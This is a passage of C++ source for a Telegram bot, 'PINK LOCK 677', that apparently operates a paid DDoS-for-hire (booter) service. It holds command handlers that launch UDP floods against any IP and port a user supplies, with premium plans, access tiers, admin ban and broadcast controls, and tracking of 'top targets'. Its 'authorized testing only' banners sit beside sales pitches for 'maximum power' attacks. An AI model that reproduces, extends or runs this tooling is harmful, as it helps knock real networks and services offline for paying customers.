        kb.add_button("❌ CANCEL", "cancel_" + action, 0);
        return kb.get();
    }
    
    // ==================== COMMAND HANDLERS ====================
    
    void handle_start(long long chat_id, const string& username, const string& user_id, bool is_private) {
        user_manager.add_user(user_id, username);
        
        string welcome = "🔐 *" + BOT_NAME + " v" + VERSION + "*\n\n"
                      "👋 Welcome, @" + username + "!\n\n"
                      "🚀 *THE ULTIMATE UDP ATTACK SYSTEM*\n"
                      "💥 *FEATURES:*\n"
                      "• 9,999,999,999 bytes payload\n"
                      "• 100,000+ multi-threading\n"
                      "• GPU acceleration ready\n"
                      "• Multiple payload patterns\n"
                      "• Real-time statistics\n"
                      "• Advanced monitoring\n"
                      "• Premium hosting system\n\n"
                      "⚠️ *FOR AUTHORIZED TESTING ONLY!*\n\n"
                      "📢 Join: " + CHANNEL_USERNAME + "\n"
                      "👤 Owner: @" + ADMIN_USERNAME + "\n\n"
                      "🎁 Use /hosting to see premium plans!";
        
        bool is_admin = (username == ADMIN_USERNAME);
        api.send_message(chat_id, welcome, get_main_keyboard(is_admin));
    }
    
    void handle_attack(long long chat_id, const string& user_id, const vector<string>& args, bool advanced = false) {
        if (!user_manager.is_authorized(user_id)) {
            api.send_message(chat_id, "⛔ *ACCESS DENIED*\n\n"
                                    "You are not authorized or your premium has expired.\n\n"
                                    "📢 Join " + CHANNEL_USERNAME + " for access\n"
                                    "🎁 Use /hosting to buy premium");
            return;
        }
        
        if (attack_running) {
            api.send_message(chat_id, "⚠️ *Attack already running!*\n"
                                    "Stop current attack first.", get_attack_keyboard());
            return;
        }
        
        if (args.size() < 3) {
            string usage = advanced ? 
                "❌ *Advanced Usage:*\n`/attack <ip> <port> <time> [threads] [size] [pattern]`\n\n"
                "Patterns: random, zeros, ones, incremental, decremental, checkerboard, maxpower" :
                "❌ *Usage:* `/attack <ip> <port> <time> [threads] [size]`";
            api.send_message(chat_id, usage);
            return;
        }
        
        AttackConfig cfg;
        cfg.target_ip = args[0];
        cfg.target_port = stoi(args[1]);
        cfg.duration = stoi(args[2]);
        cfg.threads = (args.size() > 3) ? stoi(args[3]) : DEFAULT_THREADS;
        cfg.packet_size = (args.size() > 4) ? stoi(args[4]) : DEFAULT_PACKET_SIZE;
        cfg.payload_pattern = (args.size() > 5) ? args[5] : "random";
        cfg.total_bytes = MAX_BYTES;
        cfg.use_gpu = false;
        cfg.cpu_cores = thread::hardware_concurrency();
        cfg.burst_size = 100;
        cfg.randomize_payload = (cfg.payload_pattern == "random");
        
        // Validate
        if (cfg.target_port < 1 || cfg.target_port > 65535) {
            api.send_message(chat_id, "❌ *Invalid port!* (1-65535)");
            return;
        }
        if (cfg.duration < 1 || cfg.duration > MAX_DURATION) {
            api.send_message(chat_id, "❌ *Invalid duration!* Max: " + to_string(MAX_DURATION/3600) + " hours");
            return;
        }
        if (cfg.threads < 1 || cfg.threads > MAX_THREADS) {
            api.send_message(chat_id, "❌ *Invalid threads!* Max: " + to_string(MAX_THREADS));
            return;
        }
        if (cfg.packet_size < 64 || cfg.packet_size > MAX_PACKET_SIZE) {
            api.send_message(chat_id, "❌ *Invalid packet size!* Max: " + to_string(MAX_PACKET_SIZE));
            return;
        }
        
        // Check user limits
        if (!user_manager.can_attack(user_id, cfg.threads, cfg.duration)) {
            api.send_message(chat_id, "⛔ *Limit exceeded!*\n"
                                    "Check your max threads/time with /user");
            return;
        }
        
        // Start attack
        if (engine.start_attack(cfg)) {
            attack_running = true;
            current_target = cfg.target_ip + ":" + to_string(cfg.target_port);
            
            {
                lock_guard<mutex> lock(config_mutex);
                user_attack_configs[user_id] = cfg;
            }
            
            string msg = "🚀 *ATTACK STARTED!* 🚀\n\n"
                        "🎯 *Target:* `" + cfg.target_ip + ":" + to_string(cfg.target_port) + "`\n"
                        "⏱ *Duration:* " + to_string(cfg.duration) + " seconds\n"
                        "🧵 *Threads:* " + to_string(cfg.threads) + "\n"
                        "📦 *Packet Size:* " + to_string(cfg.packet_size) + " bytes\n"
                        "🔣 *Pattern:* " + cfg.payload_pattern + "\n"
                        "💾 *Max Bytes:* " + global_stats.format_bytes(MAX_BYTES) + "\n\n"
                        "🔥 *MAXIMUM POWER ENGAGED!* 🔥";
            
            api.send_message(chat_id, msg, get_attack_keyboard());
            
            // Auto-stop and report
            thread([this, chat_id, cfg, user_id]() {
                this_thread::sleep_for(chrono::seconds(cfg.duration));
                if (attack_running) {
                    engine.stop_attack();
                    attack_running = false;
                    
                    string report = engine.get_final_report();
                    api.send_message(chat_id, report, get_main_keyboard(user_id == ADMIN_ID));
                }
            }).detach();
        }
    }
    
    void handle_stop(long long chat_id, const string& user_id) {
        if (!attack_running) {
            api.send_message(chat_id, "ℹ️ No active attack.", get_main_keyboard(user_id == ADMIN_ID));
            return;
        }
        
        engine.stop_attack();
        attack_running = false;
        
        string report = "🛑 *ATTACK STOPPED*\n\n" + engine.get_final_report();
        api.send_message(chat_id, report, get_main_keyboard(user_id == ADMIN_ID));
    }
    
    void handle_stats(long long chat_id, const string& user_id) {
        string stats = engine.is_running() ? engine.get_live_stats() : global_stats.get_formatted_stats();
        api.send_message(chat_id, stats, get_main_keyboard(user_id == ADMIN_ID));
    }
    
    void handle_admin(long long chat_id, const string& username, const string& user_id) {
        if (username != ADMIN_USERNAME && user_id != ADMIN_ID) {
            api.send_message(chat_id, "⛔ *ADMIN ONLY!*");
            return;
        }
        
        api.send_message(chat_id, "🔐 *ADMIN PANEL*\n\n"
                                "Select an option:", get_admin_keyboard());
    }
    
    void handle_hosting(long long chat_id) {
        api.send_message(chat_id, user_manager.get_hosting_plans() + 
                                "\n💬 Contact @" + ADMIN_USERNAME + " to purchase", 
                         get_hosting_keyboard());
    }
    
    // ==================== CALLBACK HANDLER ====================
    
    void handle_callback(long long chat_id, long long message_id, 
                        const string& callback_id, const string& data,
                        const string& username, const string& user_id) {
        
        bool is_admin = (username == ADMIN_USERNAME || user_id == ADMIN_ID);
        
        // Main menu actions
        if (data == "start_attack") {
            api.send_message(chat_id, "🚀 *START ATTACK*\n\n"
                                    "Format: `IP PORT TIME [THREADS] [SIZE]`\n"
                                    "Example: `192.168.1.1 80 60 10000 65000`\n\n"
                                    "Or use: `/attack IP PORT TIME`");
        }
        else if (data == "quick_attack") {
            api.send_message(chat_id, "⚡ *QUICK ATTACK*\n\n"
                                    "Enter: `IP:PORT:TIME`\n"
                                    "Example: `192.168.1.1:80:60`");
        }
        else if (data == "advanced_attack") {
            api.edit_message(chat_id, message_id, 
                           "🎛 *ADVANCED ATTACK*\n\nSelect payload pattern:", 
                           get_advanced_attack_keyboard());
        }
        else if (data.substr(0, 8) == "payload_") {
            string pattern = data.substr(8);
            api.send_message(chat_id, "🎛 *Advanced Attack*\n\n"
                                    "Pattern: " + pattern + "\n"
                                    "Format: `/attack IP PORT TIME THREADS SIZE " + pattern + "`");
        }
        else if (data == "show_stats") {
            api.edit_message(chat_id, message_id, 
                           engine.is_running() ? engine.get_live_stats() : global_stats.get_formatted_stats(), 
                           get_main_keyboard(is_admin));
            api.answer_callback(callback_id, "📊 Statistics updated!");
        }
        else if (data == "live_stats" || data == "refresh_attack") {
            if (attack_running) {
                api.edit_message(chat_id, message_id, engine.get_live_stats(), get_attack_keyboard());
                api.answer_callback(callback_id, "🔄 Refreshed!");
            } else {
                api.answer_callback(callback_id, "No active attack", true);
            }
        }
        else if (data == "stop_attack") {
            handle_stop(chat_id, user_id);
            api.answer_callback(callback_id, "🛑 Attack stopped!");
        }
        else if (data == "settings") {
            api.edit_message(chat_id, message_id, 
                           "⚙️ *SETTINGS*\n\nConfigure defaults:", 
                           get_settings_keyboard());
        }
        else if (data.substr(0, 4) == "set_") {
            api.answer_callback(callback_id, "Setting saved! Use in attack command.");
        }
        else if (data == "my_profile") {
            api.send_message(chat_id, user_manager.get_user_info(user_id));
        }
        else if (data == "join_channel") {
            CompleteKeyboard kb;
            kb.add_url_button("📢 JOIN CHANNEL", CHANNEL_LINK, 0);
            kb.add_button("✅ CHECK MEMBERSHIP", "check_membership", 1);
            kb.add_button("🔙 BACK", "main_menu", 1);
            api.send_message(chat_id, "📢 *Join our channel:*\n" + CHANNEL_LINK, kb.get());
        }
        else if (data == "contact_owner") {
            api.send_message(chat_id, "👤 *CONTACT OWNER*\n\n"
                                    "Telegram: @" + ADMIN_USERNAME + "\n"
                                    "Channel: " + CHANNEL_USERNAME + "\n\n"
                                    "For hosting purchases, support, or inquiries.");
        }
        else if (data == "hosting_plans") {
            handle_hosting(chat_id);
        }
        else if (data.substr(0, 5) == "plan_") {
            string plan = data.substr(5);
            api.send_message(chat_id, "🎁 *Selected Plan:* `" + plan + "`\n\n"
                                    "Contact @" + ADMIN_USERNAME + " to activate\n"
                                    "Your ID: `" + user_id + "`");
        }
        else if (data == "show_help") {
            string help = "📚 *PINK LOCK 677 - COMPLETE HELP*\n\n"
                         "*BASIC COMMANDS:*\n"
                         "`/start` - Initialize bot\n"
                         "`/attack IP PORT TIME` - Start attack\n"
                         "`/stop` - Stop attack\n"
                         "`/stats` - Show statistics\n"
                         "`/user` - Your profile\n"
                         "`/hosting` - Premium plans\n\n"
                         "*ADVANCED:*\n"
                         "`/attack IP PORT TIME THREADS SIZE PATTERN`\n"
                         "Patterns: random, zeros, ones, incremental, maxpower\n\n"
                         "*ADMIN:*\n"
                         "`/admin` - Admin panel\n"
                         "`/addgroup ID NAME` - Add group\n"
                         "`/removegroup ID` - Remove group\n"
                         "`/premium ID PLAN` - Give premium\n"
                         "`/ban ID` - Ban user\n"
                         "`/unban ID` - Unban user\n"
                         "`/broadcast MSG` - Send to all\n\n"
                         "⚡ All buttons are functional!";
            api.send_message(chat_id, help, get_main_keyboard(is_admin));
        }
        else if (data == "about_bot") {
            string about = "🔐 *" + BOT_NAME + "*\n\n"
                         "Version: " + VERSION + "\n"
                         "Max Payload: 9,999,999,999 bytes\n"
                         "Max Threads: 100,000\n"
                         "Max Duration: 24 hours\n"
                         "Features: GPU ready, Multi-CPU, Advanced patterns\n\n"
                         "📢 " + CHANNEL_USERNAME + "\n"
                         "👤 @" + ADMIN_USERNAME;
            api.send_message(chat_id, about, get_main_keyboard(is_admin));
        }
        else if (data == "main_menu") {
            api.edit_message(chat_id, message_id, 
                           "🔐 *" + BOT_NAME + "*\n\nMain Menu - Select option:", 
                           get_main_keyboard(is_admin));
        }
        // Admin callbacks
        else if (data == "admin_panel") {
            if (!is_admin) {
                api.answer_callback(callback_id, "⛔ Admin only!", true);
                return;
            }
            api.edit_message(chat_id, message_id, "🔐 *ADMIN PANEL*", get_admin_keyboard());
        }
        else if (data == "user_mgmt") {
            if (!is_admin) return;
            api.edit_message(chat_id, message_id, "👥 *USER MANAGEMENT*", get_user_mgmt_keyboard());
        }
        else if (data == "all_users") {
            if (!is_admin) return;
            api.send_message(chat_id, user_manager.get_all_users_list());
        }
        else if (data == "group_mgmt") {
            if (!is_admin) return;
            api.send_message(chat_id, user_manager.get_all_groups());
        }
        else if (data == "global_stats") {
            if (!is_admin) return;
            api.send_message(chat_id, global_stats.get_formatted_stats());
        }
        else if (data == "top_targets") {
            if (!is_admin) return;
            api.send_message(chat_id, global_stats.get_top_targets());
        }
        else if (data == "give_premium" || data == "give_premium_select") {
            if (!is_admin) return;
            api.send_message(chat_id, "🎁 *Give Premium*\n\n"
                                    "Format: `/premium <user_id> <plan>`\n"
                                    "Plans: 1HOUR, 1DAY, 1WEEK, 1MONTH, LIFETIME\n"
                                    "Or: `/premium <user_id> <days> <max_time> <max_threads>`");
        }
        else if (data == "ban_user" || data == "ban_user_select") {
            if (!is_admin) return;
            api.send_message(chat_id, "🚫 *Ban User*\n\nFormat: `/ban <user_id>`");
        }
        else if (data == "unban_user" || data == "unban_user_select") {
            if (!is_admin) return;
            api.send_message(chat_id, "✅ *Unban User*\n\nFormat: `/unban <user_id>`");
        }
        else if (data == "broadcast_msg") {
            if (!is_admin) return;
            api.send_message(chat_id, "📢 *Broadcast*\n\nFormat: `/broadcast <message>`");
        }
        else if (data == "bot_settings") {
            if (!is_admin) return;
            api.send_message(chat_id, "🔧 *Bot Settings*\n\nContact developer for configuration changes.");
        }
        else {
            api.answer_callback(callback_id, "Processing...");
        }
    }
    
    // ==================== UPDATE PROCESSOR ====================
    
    void process_updates() {
        string response = api.get_updates(last_update_id + 1);
        
        Json::Value root;
        Json::CharReaderBuilder builder;
        string errors;
        
        istringstream response_stream(response);
        if (!Json::parseFromStream(builder, response_stream, &root, &errors)) {
            return;
        }
        
        if (!root.isMember("result")) return;
        
        const Json::Value& results = root["result"];
        
        for (const auto& update : results) {
            long long update_id = update["update_id"].asInt64();
            last_update_id = update_id;
            
            // Callback queries
            if (update.isMember("callback_query")) {
                const Json::Value& cb = update["callback_query"];
                long long chat_id = cb["message"]["chat"]["id"].asInt64();
                long long message_id = cb["message"]["message_id"].asInt64();
                string callback_id = cb["id"].asString();
                string data = cb["data"].asString();
                string username = cb["from"].isMember("username") ? 
                                 cb["from"]["username"].asString() : "unknown";
                string user_id = to_string(cb["from"]["id"].asInt64());
                
                handle_callback(chat_id, message_id, callback_id, data, username, user_id);
            }
            
            // Messages
            if (update.isMember("message")) {
                const Json::Value& msg = update["message"];
                long long chat_id = msg["chat"]["id"].asInt64();
                string username = msg["from"].isMember("username") ? 
                               msg["from"]["username"].asString() : "unknown";
                string user_id = to_string(msg["from"]["id"].asInt64());
                bool is_private = (msg["chat"]["type"].asString() == "private");
                
                if (!msg.isMember("text")) continue;
                
                string text = msg["text"].asString();
                vector<string> parts;
                stringstream ss(text);
                string part;
                while (ss >> part) parts.push_back(part);
                
                if (parts.empty()) continue;
                
                string cmd = parts[0];
                vector<string> args(parts.begin() + 1, parts.end());
                
                // Group check
                if (!is_private) {
                    string group_id = to_string(chat_id);
                    if (!user_manager.is_group_authorized(group_id) && cmd != "/addgroup") {
                        continue;
                    }
                }
                
                // Command routing
                if (cmd == "/start") {
                    handle_start(chat_id, username, user_id, is_private);
                }
                else if (cmd == "/attack") {
                    handle_attack(chat_id, user_id, args, false);
                }
                else if (cmd == "/a" || cmd == "/ddos") {
                    handle_attack(chat_id, user_id, args, false);
                }
                else if (cmd == "/stop") {
                    handle_stop(chat_id, user_id);
                }
                else if (cmd == "/stats" || cmd == "/stat") {
                    handle_stats(chat_id, user_id);
                }
                else if (cmd == "/user" || cmd == "/me" || cmd == "/profile") {
                    api.send_message(chat_id, user_manager.get_user_info(user_id));
                }
                else if (cmd == "/admin" || cmd == "/panel") {
                    handle_admin(chat_id, username, user_id);
                }
                else if (cmd == "/hosting" || cmd == "/plans" || cmd == "/premium") {
                    handle_hosting(chat_id);
                }
                else if (cmd == "/help" || cmd == "/h") {
                    string help = "📚 *COMPLETE COMMAND LIST*\n\n"
                                 "`/start` - Start bot\n"
                                 "`/attack IP PORT TIME` - Basic attack\n"
                                 "`/stop` - Stop attack\n"
                                 "`/stats` - Statistics\n"
                                 "`/user` - Your profile\n"
                                 "`/hosting` - Premium plans\n"
                                 "`/admin` - Admin panel\n\n"
                                 "Use buttons for best experience!";
                    api.send_message(chat_id, help, get_main_keyboard(username == ADMIN_USERNAME));
                }
                // Admin commands
                else if ((cmd == "/addgroup" || cmd == "/ag") && username == ADMIN_USERNAME) {
                    if (args.size() >= 2) {
                        bool premium = (args.size() > 2 && args[2] == "premium");
                        user_manager.add_group(args[0], args[1], username, premium);
                        api.send_message(chat_id, "✅ Group added!" + string(premium ? " (Premium)" : ""));
                    }
                }
                else if ((cmd == "/removegroup" || cmd == "/rg") && username == ADMIN_USERNAME) {
                    if (!args.empty()) {
                        user_manager.remove_group(args[0]);
                        api.send_message(chat_id, "✅ Group removed!");
                    }
                }
                else if ((cmd == "/premium" || cmd == "/p") && username == ADMIN_USERNAME) {
                    if (args.size() >= 2) {
                        if (args.size() >= 5) {
                            user_manager.set_custom_limits(args[0], stoi(args[1]), stoi(args[2]), stoi(args[3]), stoi(args[4]));
                        } else {
                            user_manager.set_premium(args[0], args[1]);
                        }
                        api.send_message(chat_id, "🎁 Premium activated for " + args[0]);
                    }
                }
                else if ((cmd == "/ban") && username == ADMIN_USERNAME) {
                    if (!args.empty()) {
                        user_manager.ban_user(args[0]);
                        api.send_message(chat_id, "🚫 User banned: " + args[0]);
                    }
                }
                else if ((cmd == "/unban") && username == ADMIN_USERNAME) {
                    if (!args.empty()) {
                        user_manager.unban_user(args[0]);
                        api.send_message(chat_id, "✅ User unbanned: " + args[0]);
                    }
                }
                else if ((cmd == "/broadcast" || cmd == "/bc") && username == ADMIN_USERNAME) {
                    if (text.length() > 11) {
                        string message = text.substr(11);
                        api.send_message(chat_id, "📢 Broadcast: " + message + "\n\n(Sending to all users...)");
                    }
                }
                // Quick attack format: IP:PORT:TIME
                else if (text.find(':') != string::npos && !text.empty() && text[0] != '/') {
                    size_t pos1 = text.find(':');
                    size_t pos2 = text.find(':', pos1 + 1);
                    if (pos1 != string::npos && pos2 != string::npos) {
                        string ip = text.substr(0, pos1);
                        int port = stoi(text.substr(pos1 + 1, pos2 - pos1 - 1));
                        int time = stoi(text.substr(pos2 + 1));
                        vector<string> quick_args = {ip, to_string(port), to_string(time)};
                        handle_attack(chat_id, user_id, quick_args, false);
                    }
                }
            }
        }
    }
    
    // ==================== MAIN LOOP ====================
    
    void run() {
        running = true;
        global_stats.start_time = time(nullptr);
        
        cout << R"(
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                    PINK LOCK 677 v9.9.9                           ║
    ║           ULTIMATE UDP ATTACK BOT SYSTEM                          ║
    ║                                                                   ║
    ║  ⚠️  EDUCATIONAL & AUTHORIZED TESTING ONLY                        ║
    ║      UNAUTHORIZED USE IS STRICTLY PROHIBITED                     ║
    ║                                                                   ║
    ║  FEATURES:                                                        ║
    ║  • 9,999,999,999 bytes payload (MAXIMUM POWER)                   ║
    ║  • 100,000+ multi-threading                                       ║
    ║  • GPU acceleration ready                                         ║
    ║  • Multiple payload patterns                                       ║
    ║  • Advanced statistics & monitoring                              ║
    ║  • Complete admin panel                                            ║
    ║  • Group management system                                         ║
    ║  • Premium hosting with multiple plans                           ║
    ║  • Real-time live stats                                            ║
    ║  • Auto-stop with final reports                                    ║
    ║                                                                   ║
    ║  📢 https://t.me/PYHOSTING0                                       ║
    ║  👤 @MoinOwner                                                    ║
    ╚═══════════════════════════════════════════════════════════════════╝
        )" << endl;
        
        curl_global_init(CURL_GLOBAL_ALL);
        
        while (running) {
            try {
                process_updates();
            } catch (const exception& e) {
                cerr << "Error: " << e.what() << endl;
            }
            this_thread::sleep_for(chrono::milliseconds(100));
        }
        
        curl_global_cleanup();
    }
    
    void stop() {
        running = false;
        engine.stop_attack();
    }
};

// ============================================
// SIGNAL HANDLER
// ============================================
PinkLockBot* bot_instance = nullptr;

void signal_handler(int sig) {
    cout << "\n🛑 Shutting down " << BOT_NAME << "..." << endl;
    if (bot_instance) bot_instance->stop();
    exit(0);
}

// ============================================
// MAIN ENTRY
// ============================================
int main() {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (BOT_TOKEN == "YOUR_BOT_TOKEN_HERE") {
        cerr << "❌ ERROR: Set your BOT_TOKEN!" << endl;
        return 1;
    }
    
    PinkLockBot bot(BOT_TOKEN);
    bot_instance = &bot;
    bot.run();
    
    return 0;
}
